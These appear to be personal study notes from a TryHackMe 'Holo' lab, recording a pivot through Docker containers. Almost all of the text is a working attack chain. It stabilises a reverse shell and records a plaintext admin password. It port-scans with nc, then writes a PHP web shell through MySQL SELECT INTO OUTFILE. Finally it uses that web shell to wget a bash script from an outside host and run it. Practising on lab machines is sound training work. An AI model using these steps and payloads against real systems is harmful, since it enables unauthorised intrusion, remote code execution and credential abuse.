- **Reverse shell** from [[PNPT/THM Boxes/Holo/10.200.107.33/Port 80]]
- Let's get a proper shell first
	- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
	- `Ctrl + Z`
	- `stty raw -echo; fg`
	- `export TERM=xterm`

 - Clearly, a docker container with ip ==`192.168.100.100:
	 - ![[Pasted image 20250405050408.png]]
	 - ![[Pasted image 20250405063236.png]]
- Found more `credentials` : `admin : !123SecureAdminDashboard321!`
![[Pasted image 20250405063108.png]]
- ==`192.168.100.1` looks like another `container` running==:
- Scan using `nc`:
	- `nc -zv 192.168.100.1 1-65535`
		- ![[Pasted image 20250405063345.png]]

# 192.168.100.1
---
- From THM guide:
	- ![[Pasted image 20250405063639.png]]

- `mysql -h 192.168.100.1 -u admin -p`
	- ![[Pasted image 20250405063826.png]]
- `use DashboardDB;`
- `select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell_drass.php';`
- Invoke the shell using:
	- `curl 192.168.100.1:8080/shell_drass.php?cmd=hostname`
	- ![[Pasted image 20250405065156.png]]
- Looks like this is our **==linux machine==**
- Getting shell using `bash` shell:
	- `curl 192.168.100.1:8080/shell_drass.php?cmd=wget%2010%2E50%2E103%2E180%3A8000%2Fbash%5Fshell%2Esh`
	- `curl 192.168.100.1:8080/shell_drass.php?cmd=chmod%20%2Bx%20bash%5Fshell%2Esh`
	- `curl 192.168.100.1:8080/shell_drass.php?cmd=bash%20bash%5Fshell%2Esh`